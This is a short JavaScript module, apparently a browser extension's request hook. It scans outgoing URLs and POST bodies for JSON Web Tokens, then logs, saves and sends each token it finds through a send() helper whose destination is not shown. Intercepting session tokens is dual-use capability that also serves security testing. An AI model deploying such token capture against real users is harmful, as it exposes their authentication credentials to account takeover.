import { save, send, ourURL } from './utilities'
import { JWT, findJWT } from './jwt'


const processRequest = (req, match) => {
    const data = JWT(match, { url: req.url, type: 'R', name: req.type })
    console.log('JWT FOUND', data)
    save(data)
    send(data)
}

const decodeRaw = (raw) => {
    return raw.map(data => {
        return decodeURIComponent(String.fromCharCode.apply(null, new Uint8Array(data.bytes)));
    }).join('')
}

const onBeforeRequestHandler = req => {
    if (ourURL(req.url)) {
        return
    }
    if (req.method === 'POST') {
        console.debug("POST sent")
    }
    const urlMatch = findJWT(req.url)
    if (urlMatch !== null) {
        processRequest(req, urlMatch)
    }
    if (req.requestBody?.raw) {
        const rawMatch = findJWT(decodeRaw(req.requestBody.raw))
        console.debug(req.requestBody.formData)
        if (rawMatch !== null) {
            processRequest(req, rawMatch)
        }
    }
}

export default onBeforeRequestHandler